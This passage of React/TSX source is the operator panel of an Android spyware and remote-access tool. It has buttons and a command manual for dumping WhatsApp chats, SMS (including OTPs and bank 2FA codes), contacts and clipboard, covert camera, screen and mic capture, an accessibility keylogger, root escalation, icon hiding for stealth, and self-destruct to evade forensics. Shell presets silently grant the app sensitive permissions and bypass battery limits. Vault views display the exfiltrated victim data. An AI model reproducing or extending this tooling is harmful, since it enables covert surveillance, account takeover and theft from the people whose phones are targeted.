                          <p className="text-xs text-slate-400">Awaiting GPS telemetry packet from device...</p>
                        </div>
                      )}
                    </div>
                  )}

                  {liveStreamTab === "terminal" && (
                    <div className="w-full h-full flex flex-col text-left space-y-3 font-mono text-xs">
                      {/* Mode Toggle Header: Quick Shell vs Custom Script Runner */}
                      <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                        <div className="flex gap-2">
                          <button
                            type="button"
                            onClick={() => setTerminalTabMode("quick")}
                            className={cn(
                              "px-3 py-1 rounded-lg text-xs font-sans font-bold transition-all cursor-pointer",
                              terminalTabMode === "quick"
                                ? "bg-blue-600 text-white shadow-sm"
                                : "bg-slate-800 text-slate-400 hover:text-white"
                            )}
                          >
                            ⚡ Shell Commands
                          </button>
                          <button
                            type="button"
                            onClick={() => setTerminalTabMode("script")}
                            className={cn(
                              "px-3 py-1 rounded-lg text-xs font-sans font-bold transition-all cursor-pointer flex items-center gap-1.5",
                              terminalTabMode === "script"
                                ? "bg-emerald-600 text-white shadow-sm"
                                : "bg-slate-800 text-slate-400 hover:text-white"
                            )}
                          >
                            <Sparkles size={12} /> Custom Script Runner
                          </button>
                        </div>
                        <span className="text-[10px] text-slate-400 font-mono">
                          Target: <b className="text-blue-400">{selectedDevice}</b>
                        </span>
                      </div>

                      {/* Live Terminal & Device Execution Output Feed */}
                      <div className="h-48 overflow-y-auto bg-black p-3 rounded-xl border border-slate-800 space-y-2 text-emerald-400 font-mono text-[11px]">
                        {/* Device Shell Output Logs from incoming beacons */}
                        {(data?.logs || [])
                          .filter((l: any) => l.type === "shell_output" || l.type === "command_status")
                          .slice(0, 15)
                          .map((log: any, idx: number) => (
                            <div key={`device-out-${idx}`} className="border-l-2 border-emerald-500 pl-2 py-0.5 leading-tight bg-slate-950/60 rounded-r">
                              <div className="flex items-center gap-1.5 text-slate-500 text-[10px]">
                                <span>[{new Date(log.timestamp || Date.now()).toLocaleTimeString()}]</span>
                                <span className="text-cyan-400 font-bold">[{log.device_id || "Agent"}]</span>
                                {log.privilege_level && (
                                  <span className="text-amber-400 bg-amber-500/10 px-1 rounded text-[9px] font-sans">
                                    {log.privilege_level}
                                  </span>
                                )}
                              </div>
                              {log.command && <div className="text-blue-400 mt-0.5">&gt; {log.command}</div>}
                              {log.title && <div className="text-emerald-300 font-bold mt-0.5">{log.title}</div>}
                              {log.output && (
                                <pre className="text-slate-300 whitespace-pre-wrap font-mono mt-1 text-[10px] bg-black/40 p-1.5 rounded max-h-28 overflow-y-auto">
                                  {log.output}
                                </pre>
                              )}
                              {log.message && (
                                <div className="text-slate-300 whitespace-pre-wrap font-mono mt-0.5 text-[10px]">
                                  {log.message}
                                </div>
                              )}
                            </div>
                          ))}

                        {/* Local Dispatched History */}
                        {terminalHistory.map((item, idx) => (
                          <div key={`hist-${idx}`} className="leading-tight opacity-75">
                            <span className="text-slate-500">[{item.time}]</span>{" "}
                            <span className="text-blue-400">&gt; {item.cmd}</span>
                            {item.output && <div className="text-slate-400 ml-4 mt-0.5">{item.output}</div>}
                          </div>
                        ))}
                      </div>

                      {terminalTabMode === "quick" ? (
                        <>
                          {/* Quick Command Insertion Palette */}
                          <div className="flex items-center gap-1.5 overflow-x-auto no-scrollbar py-1">
                            <span className="text-[10px] text-slate-500 uppercase font-sans font-bold shrink-0">Quick Cmds:</span>
                            {[
                              "dump_whatsapp",
                              "dump_sms",
                              "dump_contacts",
                              "get_apps",
                              "get_clipboard",
                              "capture_screen",
                              "capture_camera_low",
                              "stream_mic 10",
                              "get_device_info",
                              "hide_icon",
                              "show_icon",
                              "lock_device",
                              "escalate_root",
                              "exec getprop",
                              "exec whoami",
                              "self_destruct"
                            ].map((qCmd) => (
                              <button
                                key={qCmd}
                                type="button"
                                onClick={() => setTerminalInput(qCmd)}
                                className="px-2 py-0.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] rounded-md font-mono shrink-0 transition-colors cursor-pointer border border-slate-700"
                              >
                                {qCmd}
                              </button>
                            ))}
                          </div>

                          {/* Command Input Form */}
                          <form onSubmit={handleTerminalSubmit} className="flex gap-2">
                            <input
                              type="text"
                              value={terminalInput}
                              onChange={(e) => setTerminalInput(e.target.value)}
                              placeholder="Type command (e.g. dump_whatsapp, dump_sms, get_apps, lock_device, exec whoami)..."
                              className="flex-1 bg-black border border-slate-800 text-emerald-400 px-3 py-2 rounded-xl text-xs focus:outline-none focus:border-blue-500 font-mono"
                            />
                            <button
                              type="submit"
                              className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer shrink-0"
                            >
                              <Send size={14} /> Send
                            </button>
                          </form>
                        </>
                      ) : (
                        /* Custom Script Runner Panel */
                        <form onSubmit={handleScriptSubmit} className="space-y-2">
                          {/* Presets */}
                          <div className="flex items-center gap-1.5 overflow-x-auto no-scrollbar py-0.5">
                            <span className="text-[10px] text-emerald-500 uppercase font-sans font-bold shrink-0">Script Presets:</span>
                            {[
                              {
                                label: "🛡️ Auto-Grant Permissions",
                                script: "pm grant com.cyber.offensive android.permission.ACCESS_FINE_LOCATION && pm grant com.cyber.offensive android.permission.READ_SMS && pm grant com.cyber.offensive android.permission.READ_CONTACTS && pm grant com.cyber.offensive android.permission.RECORD_AUDIO && pm grant com.cyber.offensive android.permission.CAMERA"
                              },
                              {
                                label: "🔋 Bypass Battery Doze",
                                script: "dumpsys deviceidle whitelist +com.cyber.offensive && cmd appops set com.cyber.offensive RUN_IN_BACKGROUND allow"
                              },
                              {
                                label: "🔍 Privilege & Recon",
                                script: "id; whoami; getprop ro.build.version.release; uname -a; pm list packages -3"
                              },
                              {
                                label: "📁 WhatsApp Databases",
                                script: "ls -la /data/data/com.whatsapp/databases/ || ls -la /sdcard/WhatsApp/Databases/"
                              },
                              {
                                label: "🌐 Network Interfaces & IPs",
                                script: "ip addr show; ip route; netstat -tulpn 2>/dev/null || cat /proc/net/arp"
                              }
                            ].map((preset) => (
                              <button
                                key={preset.label}
                                type="button"
                                onClick={() => setCustomScriptInput(preset.script)}
                                className="px-2 py-0.5 bg-slate-900 hover:bg-emerald-950 text-emerald-300 hover:text-emerald-200 text-[10px] rounded-md font-sans shrink-0 border border-emerald-800/40 cursor-pointer transition-colors"
                              >
                                {preset.label}
                              </button>
                            ))}
                          </div>

                          <div className="relative">
                            <textarea
                              rows={3}
                              value={customScriptInput}
                              onChange={(e) => setCustomScriptInput(e.target.value)}
                              placeholder={`#!/system/bin/sh\n# Enter custom shell script to execute directly on ${selectedDevice}...\n# Runs via SU -> Shizuku -> Linux shell with output captured.`}
                              className="w-full bg-black border border-slate-800 text-emerald-400 p-2.5 rounded-xl text-xs font-mono focus:outline-none focus:border-emerald-500 resize-none"
                            />
                          </div>

                          <div className="flex items-center justify-between">
                            <span className="text-[10px] text-slate-500 font-sans">
                              Executes directly on device via Root / Shizuku / Standard Shell. Output stream displays in feed above.
                            </span>
                            <button
                              type="submit"
                              disabled={actionLoading || !customScriptInput.trim()}
                              className="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 disabled:opacity-50 text-white rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer shadow"
                            >
                              <Play size={14} /> Dispatch Custom Script
                            </button>
                          </div>
                        </form>
                      )}

                      {/* Collapsible Command Guide & Benefits */}
                      <details className="bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-[11px] text-slate-400 font-sans">
                        <summary className="text-xs font-bold text-slate-300 cursor-pointer">📖 Terminal Command Manual & Red-Team Benefits</summary>
                        <div className="mt-2 space-y-1.5 pt-2 border-t border-slate-800">
                          <div><b className="text-emerald-400 font-mono">dump_whatsapp:</b> Harvests chats, crypt14/15 databases, and audio/video loot.</div>
                          <div><b className="text-blue-400 font-mono">dump_sms:</b> Intercepts all incoming/outgoing SMS (OTPs, bank 2FA, personal texts).</div>
                          <div><b className="text-indigo-400 font-mono">dump_contacts:</b> Syncs complete address book with numbers and names.</div>
                          <div><b className="text-teal-400 font-mono">get_apps:</b> Audits installed user packages (banking, crypto wallets, messengers).</div>
                          <div><b className="text-cyan-400 font-mono">get_clipboard:</b> Intercepts active clipboard copy/paste buffer (passwords, tokens).</div>
                          <div><b className="text-purple-400 font-mono">capture_screen:</b> Takes a silent screenshot of active display.</div>
                          <div><b className="text-amber-400 font-mono">stream_mic &lt;sec&gt;:</b> Records ambient room audio in low-bitrate AMR (e.g. stream_mic 15).</div>
                          <div><b className="text-slate-300 font-mono">hide_icon / show_icon:</b> Hides or restores app icon from launcher drawer for 100% stealth.</div>
                          <div><b className="text-orange-400 font-mono">lock_device:</b> Instantly locks target device with admin credentials.</div>
                          <div><b className="text-red-400 font-mono">self_destruct:</b> Silent wipe of local cache and app uninstallation to evade forensic analysis.</div>
                          <div><b className="text-yellow-400 font-mono">exec &lt;cmd&gt;:</b> Executes arbitrary Linux/Android shell command (e.g. exec whoami, exec getprop).</div>
                          <div><b className="text-emerald-400 font-mono">script &lt;code&gt;:</b> Sends multi-line shell script directly to app for execution and logs output.</div>
                        </div>
                      </details>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Quick Live Command Dispatcher & Collapsible Sidebars */}
            <div className="space-y-4">
              <div className="bg-white rounded-3xl border border-slate-200 p-5 shadow-sm">
                <h3 className="text-xs font-black uppercase tracking-wider text-slate-700 mb-3 flex items-center gap-2">
                  <Zap size={16} className="text-blue-600" />
                  <span>Immediate Live Actions</span>
                </h3>
                <div className="flex flex-col gap-2">
                  <button
                    onClick={() => handleSetCommand("dump_whatsapp")}
                    className="w-full flex items-center justify-between p-2.5 bg-emerald-50 hover:bg-emerald-100 border border-emerald-200 text-emerald-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <MessageSquare size={15} />
                      <span>Harvest WhatsApp Chats</span>
                    </div>
                    <span className="text-[10px] font-mono text-emerald-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("dump_sms")}
                    className="w-full flex items-center justify-between p-2.5 bg-blue-50 hover:bg-blue-100 border border-blue-200 text-blue-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <FileText size={15} />
                      <span>Dump SMS Messages</span>
                    </div>
                    <span className="text-[10px] font-mono text-blue-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("dump_contacts")}
                    className="w-full flex items-center justify-between p-2.5 bg-indigo-50 hover:bg-indigo-100 border border-indigo-200 text-indigo-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Users size={15} />
                      <span>Sync Phone Contacts</span>
                    </div>
                    <span className="text-[10px] font-mono text-indigo-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("get_apps")}
                    className="w-full flex items-center justify-between p-2.5 bg-teal-50 hover:bg-teal-100 border border-teal-200 text-teal-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Smartphone size={15} />
                      <span>Audit Installed Apps</span>
                    </div>
                    <span className="text-[10px] font-mono text-teal-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("get_clipboard")}
                    className="w-full flex items-center justify-between p-2.5 bg-cyan-50 hover:bg-cyan-100 border border-cyan-200 text-cyan-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Copy size={15} />
                      <span>Snatch Active Clipboard</span>
                    </div>
                    <span className="text-[10px] font-mono text-cyan-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("capture_screen")}
                    className="w-full flex items-center justify-between p-2.5 bg-sky-50 hover:bg-sky-100 border border-sky-200 text-sky-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Monitor size={15} />
                      <span>Capture Screen Frame</span>
                    </div>
                    <span className="text-[10px] font-mono text-sky-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("capture_camera_low")}
                    className="w-full flex items-center justify-between p-2.5 bg-purple-50 hover:bg-purple-100 border border-purple-200 text-purple-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Camera size={15} />
                      <span>Live Camera Snapshot</span>
                    </div>
                    <span className="text-[10px] font-mono text-purple-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("stream_mic_low")}
                    className="w-full flex items-center justify-between p-2.5 bg-amber-50 hover:bg-amber-100 border border-amber-200 text-amber-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Mic size={15} />
                      <span>Listen Ambient Mic (10s)</span>
                    </div>
                    <span className="text-[10px] font-mono text-amber-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("hide_icon")}
                    className="w-full flex items-center justify-between p-2.5 bg-slate-100 hover:bg-slate-200 border border-slate-300 text-slate-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Eye size={15} />
                      <span>Stealth: Hide App Icon</span>
                    </div>
                    <span className="text-[10px] font-mono text-slate-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("show_icon")}
                    className="w-full flex items-center justify-between p-2.5 bg-slate-100 hover:bg-slate-200 border border-slate-300 text-slate-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Eye size={15} />
                      <span>Stealth: Restore App Icon</span>
                    </div>
                    <span className="text-[10px] font-mono text-slate-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("get_device_info")}
                    className="w-full flex items-center justify-between p-2.5 bg-indigo-50 hover:bg-indigo-100 border border-indigo-200 text-indigo-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Cpu size={15} />
                      <span>Inspect Hardware & Specs</span>
                    </div>
                    <span className="text-[10px] font-mono text-indigo-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("escalate_root")}
                    className="w-full flex items-center justify-between p-2.5 bg-violet-50 hover:bg-violet-100 border border-violet-200 text-violet-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Zap size={15} />
                      <span>Attempt Privilege Escalation</span>
                    </div>
                    <span className="text-[10px] font-mono text-violet-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("lock_device")}
                    className="w-full flex items-center justify-between p-2.5 bg-orange-50 hover:bg-orange-100 border border-orange-200 text-orange-800 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <Lock size={15} />
                      <span>Remote Lock Device</span>
                    </div>
                    <span className="text-[10px] font-mono text-orange-600">&gt;</span>
                  </button>

                  <button
                    onClick={() => handleSetCommand("self_destruct")}
                    className="w-full flex items-center justify-between p-2.5 bg-red-50 hover:bg-red-100 border border-red-200 text-red-700 rounded-xl text-xs font-bold transition-all text-left"
                  >
                    <div className="flex items-center gap-2">
                      <AlertTriangle size={15} />
                      <span>Self-Destruct & Wipe</span>
                    </div>
                    <span className="text-[10px] font-mono text-red-500">&gt;</span>
                  </button>
                </div>
              </div>

              {/* Instruction 2: Dropdowns ALWAYS closed by default */}
              <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm">
                <button
                  onClick={() => toggleSection("config")}
                  className="w-full flex items-center justify-between p-4 bg-slate-50/70 hover:bg-slate-100 font-bold text-xs text-slate-800 transition-all border-b border-slate-100"
                >
                  <div className="flex items-center gap-2">
                    <SlidersHorizontal size={15} className="text-slate-600" />
                    <span>Agent Configuration Toggles</span>
                  </div>
                  <ChevronDown size={14} className={cn("text-slate-400 transition-transform duration-200", !openSections.config && "-rotate-90")} />
                </button>

                {openSections.config && (
                  <div className="p-4 space-y-3 animate-in slide-in-from-top-1 text-xs">
                    <div className="flex items-center justify-between">
                      <span>Location Tracking</span>
                      <button
                        onClick={() => handleToggleConfig("location_tracking", !config.location_tracking)}
                        className={cn("px-2.5 py-1 rounded font-bold text-[11px]", config.location_tracking ? "bg-emerald-100 text-emerald-800" : "bg-slate-100 text-slate-600")}
                      >
                        {config.location_tracking ? "ON" : "OFF"}
                      </button>
                    </div>

                    <div className="flex items-center justify-between">
                      <span>Accessibility Keylogger</span>
                      <button
                        onClick={() => handleToggleConfig("accessibility_keylogger", !config.accessibility_keylogger)}
                        className={cn("px-2.5 py-1 rounded font-bold text-[11px]", config.accessibility_keylogger ? "bg-emerald-100 text-emerald-800" : "bg-slate-100 text-slate-600")}
                      >
                        {config.accessibility_keylogger ? "ON" : "OFF"}
                      </button>
                    </div>

                    <div className="flex items-center justify-between">
                      <span>Ambient Mic Stream</span>
                      <button
                        onClick={() => handleToggleConfig("mic_recording", !config.mic_recording)}
                        className={cn("px-2.5 py-1 rounded font-bold text-[11px]", config.mic_recording ? "bg-emerald-100 text-emerald-800" : "bg-slate-100 text-slate-600")}
                      >
                        {config.mic_recording ? "ON" : "OFF"}
                      </button>
                    </div>

                    <div className="flex items-center justify-between pt-2 border-t border-slate-100">
                      <span>Terminal Authorization</span>
                      <span className="font-mono text-[10px] font-bold text-amber-700 bg-amber-50 px-2 py-0.5 rounded border border-amber-200">
                        Work in process
                      </span>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ============================================================ */}
      {/* 📂 VIEW B: RECORDED DATA & HARVESTED VAULTS                  */}
      {/* ============================================================ */}
      {mainMode === "recorded" && (
        <div className="space-y-6 animate-in fade-in duration-300">
          {/* Search & Filter Toolbar */}
          <div className="flex items-center justify-between gap-4 flex-wrap bg-white p-3.5 rounded-2xl border border-slate-200 shadow-sm">
            {/* Search Input */}
            <div className="relative flex-1 min-w-[240px]">
              <Search size={15} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search exfiltrated messages, contacts, phone numbers..."
                className="w-full pl-9 pr-4 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-800 focus:outline-none focus:border-blue-500"
              />
            </div>

            {/* Total Records Counter */}
            <div className="text-xs font-bold text-slate-500">
              Showing <span className="text-blue-600 font-mono font-black">{filteredRecordedLogs.length}</span> recorded entries
            </div>
          </div>

          {/* Dedicated Category Tabs */}
          <div className="grid grid-cols-2 sm:grid-cols-5 lg:grid-cols-10 gap-2">
            {[
              { id: "whatsapp", label: "WhatsApp", icon: MessageSquare, count: counts.whatsapp, color: "text-emerald-600 bg-emerald-50" },
              { id: "sms", label: "SMS Texts", icon: FileText, count: counts.sms, color: "text-blue-600 bg-blue-50" },
              { id: "contacts", label: "Contacts", icon: Users, count: counts.contacts, color: "text-indigo-600 bg-indigo-50" },
              { id: "apps", label: "Apps", icon: Smartphone, count: counts.apps, color: "text-teal-600 bg-teal-50" },
              { id: "clipboard", label: "Clipboard", icon: Copy, count: counts.clipboard, color: "text-cyan-600 bg-cyan-50" },
              { id: "calls", label: "Call Logs", icon: PhoneCall, count: counts.calls, color: "text-violet-600 bg-violet-50" },
              { id: "camera", label: "Photos & Screen", icon: Camera, count: counts.camera, color: "text-rose-600 bg-rose-50" },
              { id: "mic", label: "Audio Memos", icon: Mic, count: counts.mic, color: "text-amber-600 bg-amber-50" },
              { id: "keylogger", label: "Keylogger", icon: Terminal, count: counts.keylogger, color: "text-slate-700 bg-slate-100" },
              { id: "all", label: "All Telemetry", icon: Database, count: counts.all, color: "text-slate-600 bg-slate-50" },
            ].map((tab) => {
              const Icon = tab.icon;
              const isActive = recordedTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setRecordedTab(tab.id as any)}
                  className={cn(
                    "flex flex-col items-center justify-center p-3 rounded-2xl border text-center transition-all",
                    isActive
                      ? "bg-blue-600 border-blue-600 text-white shadow-md shadow-blue-600/20"
                      : "bg-white border-slate-200 text-slate-600 hover:bg-slate-50"
                  )}
                >
                  <Icon size={18} className={isActive ? "text-white mb-1" : cn(tab.color.split(" ")[0], "mb-1")} />
                  <span className="text-[11px] font-bold truncate max-w-full">{tab.label}</span>
                  <span className={cn(
                    "text-[10px] font-mono px-1.5 py-0.2 rounded-full mt-1",
                    isActive ? "bg-white/20 text-white" : "bg-slate-100 text-slate-700"
                  )}>
                    {tab.count}
                  </span>
                </button>
              );
            })}
          </div>

          {/* Recorded Content Display */}
          <div className="bg-white rounded-3xl border border-slate-200 shadow-sm overflow-hidden p-6">
            {filteredRecordedLogs.length === 0 ? (
              <div className="text-center py-16 space-y-3">
                <FolderArchive size={40} className="text-slate-300 mx-auto" />
                <h3 className="text-sm font-bold text-slate-700">No Recorded Records Found</h3>
                <p className="text-xs text-slate-400 max-w-sm mx-auto">
                  No records match current category or search filters. Dispatch a harvest command from the Live Connection panel to retrieve new data.
                </p>
                <button
                  onClick={() => setMainMode("live")}
                  className="px-4 py-2 bg-blue-600 text-white rounded-xl text-xs font-bold hover:bg-blue-700 transition-all inline-flex items-center gap-2"
                >
                  <Radio size={14} /> Go to Live Operations
                </button>
              </div>
            ) : (
              <div className="space-y-4">
                {/* 1. WHATSAPP VAULT */}
                {recordedTab === "whatsapp" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-emerald-700 tracking-wider flex items-center gap-2">
                      <MessageSquare size={16} /> Exfiltrated WhatsApp Chats & Loot ({filteredRecordedLogs.length})
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {filteredRecordedLogs.map((log: any, idx: number) => (
                        <div key={idx} className="bg-slate-50 border border-slate-200 rounded-2xl p-4 space-y-2 hover:shadow-sm transition-all">
                          <div className="flex items-center justify-between text-xs">
                            <span className="font-bold text-emerald-800">WhatsApp Data Packet</span>
                            <span className="text-[10px] text-slate-400">{log.timestamp}</span>
                          </div>
                          {log.loot_path && (
                            <p className="text-[11px] font-mono text-slate-600 bg-white p-2 rounded-lg border border-slate-200">
                              Loot: {log.loot_path}
                            </p>
                          )}
                          {log.voice_notes_count !== undefined && (
                            <div className="flex gap-2 text-xs">
                              <span className="px-2 py-0.5 bg-emerald-100 text-emerald-800 rounded font-bold">
                                {log.voice_notes_count} Voice Memos
                              </span>
                              <span className="px-2 py-0.5 bg-blue-100 text-blue-800 rounded font-bold">
                                {log.videos_count || 0} Videos
                              </span>
                            </div>
                          )}
                          <pre className="text-[11px] bg-slate-900 text-emerald-400 p-3 rounded-xl max-h-40 overflow-y-auto">
                            {JSON.stringify(log, null, 2)}
                          </pre>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* 2. SMS VAULT */}
                {recordedTab === "sms" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-blue-700 tracking-wider flex items-center gap-2">
                      <FileText size={16} /> Intercepted SMS Messages ({filteredRecordedLogs.length})
                    </h3>
                    <div className="divide-y divide-slate-100 border border-slate-200 rounded-2xl overflow-hidden">
                      {filteredRecordedLogs.map((log: any, idx: number) => {
                        const smsList = Array.isArray(log.sms) ? log.sms : [log];
                        return smsList.map((item: any, sIdx: number) => (
                          <div key={`${idx}-${sIdx}`} className="p-4 bg-white hover:bg-slate-50 transition-colors flex items-start justify-between gap-4">
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <span className="font-bold text-xs text-blue-900">{item.sender || item.address || "Target SMS"}</span>
                                <span className="text-[10px] text-slate-400">{log.timestamp}</span>
                              </div>
                              <p className="text-xs text-slate-700 leading-relaxed">{item.body || item.message || JSON.stringify(item)}</p>
                            </div>
                            <button
                              onClick={() => navigator.clipboard.writeText(item.body || JSON.stringify(item))}
                              className="p-1.5 text-slate-400 hover:text-blue-600 rounded-lg hover:bg-slate-100"
                              title="Copy SMS"
                            >
                              <Copy size={14} />
                            </button>
                          </div>
                        ));
                      })}
                    </div>
                  </div>
                )}

                {/* 3. CONTACTS VAULT */}
                {recordedTab === "contacts" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-indigo-700 tracking-wider flex items-center gap-2">
                      <Users size={16} /> Synced Phone Contacts ({filteredRecordedLogs.length})
                    </h3>
                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-3">
                      {filteredRecordedLogs.map((log: any, idx: number) => {
                        const contactsList = Array.isArray(log.contacts) ? log.contacts : [log];
                        return contactsList.map((c: any, cIdx: number) => (
                          <div key={`${idx}-${cIdx}`} className="bg-slate-50 border border-slate-200 p-3 rounded-2xl flex items-center justify-between">
                            <div>
                              <p className="text-xs font-bold text-slate-800">{c.name || "Contact"}</p>
                              <p className="text-[11px] font-mono text-indigo-600 font-bold">{c.number || c.phone || "No Number"}</p>
                            </div>
                            <button
                              onClick={() => navigator.clipboard.writeText(c.number || "")}
                              className="p-1 text-slate-400 hover:text-indigo-600"
                            >
                              <Copy size={13} />
                            </button>
                          </div>
                        ));
                      })}
                    </div>
                  </div>
                )}

                {/* 3B. INSTALLED APPS VAULT */}
                {recordedTab === "apps" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-teal-700 tracking-wider flex items-center gap-2">
                      <Smartphone size={16} /> Intercepted User Installed Applications ({filteredRecordedLogs.length})
                    </h3>
                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-3">
                      {filteredRecordedLogs.map((log: any, idx: number) => {
                        const appList = Array.isArray(log.apps) ? log.apps : [log];
                        return appList.map((app: any, aIdx: number) => (
                          <div key={`${idx}-${aIdx}`} className="bg-slate-50 border border-slate-200 p-3.5 rounded-2xl flex items-center justify-between">
                            <div className="space-y-0.5">
                              <p className="text-xs font-bold text-slate-800">{app.app_name || "Application"}</p>
                              <p className="text-[11px] font-mono text-teal-700">{app.package_name || app.package || "package"}</p>
                              {app.version_name && <span className="text-[10px] text-slate-400">v{app.version_name}</span>}
                            </div>
                            <span className="px-2 py-0.5 bg-teal-100 text-teal-800 text-[9px] font-black rounded-md">INSTALLED</span>
                          </div>
                        ));
                      })}
                    </div>
                  </div>
                )}

                {/* 3C. CLIPBOARD SNATCHER VAULT */}
                {recordedTab === "clipboard" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-cyan-700 tracking-wider flex items-center gap-2">
                      <Copy size={16} /> Snapped Clipboard Copy/Paste Buffers ({filteredRecordedLogs.length})
                    </h3>
                    <div className="divide-y divide-slate-100 border border-slate-200 rounded-2xl overflow-hidden bg-white">
                      {filteredRecordedLogs.map((log: any, idx: number) => (
                        <div key={idx} className="p-4 flex items-start justify-between gap-4 hover:bg-slate-50 transition-colors">
                          <div className="space-y-1">
                            <div className="flex items-center gap-2">
                              <span className="px-2 py-0.5 bg-cyan-100 text-cyan-800 text-[10px] font-bold rounded">CLIPBOARD</span>
                              <span className="text-[10px] text-slate-400">{log.timestamp}</span>
                            </div>
                            <p className="text-xs font-mono text-slate-800 bg-slate-50 p-2.5 rounded-xl border border-slate-100 whitespace-pre-wrap">
                              {log.clipboard_text || JSON.stringify(log)}
                            </p>
                          </div>
                          <button
                            onClick={() => navigator.clipboard.writeText(log.clipboard_text || "")}
                            className="p-1.5 text-slate-400 hover:text-cyan-600 rounded-lg hover:bg-slate-100 shrink-0"
                            title="Copy to clipboard"
                          >
                            <Copy size={14} />
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* 4. CALL LOGS */}
                {recordedTab === "calls" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-violet-700 tracking-wider flex items-center gap-2">
                      <PhoneCall size={16} /> Intercepted Call History ({filteredRecordedLogs.length})
                    </h3>
                    <div className="space-y-3">
                      {filteredRecordedLogs.map((log: any, idx: number) => (
                        <div key={idx} className="bg-slate-50 border border-slate-200 p-4 rounded-2xl">
                          <div className="flex items-center justify-between text-xs mb-2">
                            <span className="font-bold text-violet-900">Call Log Packet</span>
                            <span className="text-[10px] text-slate-400">{log.timestamp}</span>
                          </div>
                          <pre className="text-xs font-mono text-slate-800 whitespace-pre-wrap bg-white p-3 rounded-xl border border-slate-200">
                            {log.call_logs || JSON.stringify(log, null, 2)}
                          </pre>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* 5. MEDIA & CAMERA GALLERY */}
                {recordedTab === "camera" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-rose-700 tracking-wider flex items-center gap-2">
                      <Camera size={16} /> Captured Photos, Snapshots & Screen Frames ({filteredRecordedLogs.length})
                    </h3>
                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
                      {filteredRecordedLogs.map((log: any, idx: number) => {
                        const imgUrl = log.cloudinary_url || log.camera_url || log.screen_url;
                        return (
                          <div key={idx} className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden group relative">
                            {imgUrl ? (
                              <img src={imgUrl} alt="Snapshot" className="w-full h-40 object-cover group-hover:scale-105 transition-transform duration-300" />
                            ) : (
                              <div className="w-full h-40 flex items-center justify-center text-slate-600">
                                <Camera size={32} />
                              </div>
                            )}
                            <div className="p-2.5 text-white bg-slate-950/90 flex items-center justify-between text-[10px]">
                              <span className="truncate">{log.timestamp}</span>
                              <div className="flex items-center gap-1.5">
                                <span className={`px-1.5 py-0.5 rounded font-black ${log.type === "screen" || log.media_type === "screen" ? "bg-purple-600 text-white" : "bg-rose-600 text-white"}`}>
                                  {log.type === "screen" || log.media_type === "screen" ? "SCREEN" : "CAM"}
                                </span>
                                {imgUrl && (
                                  <a href={imgUrl} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                                    <ExternalLink size={12} />
                                  </a>
                                )}
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </div>
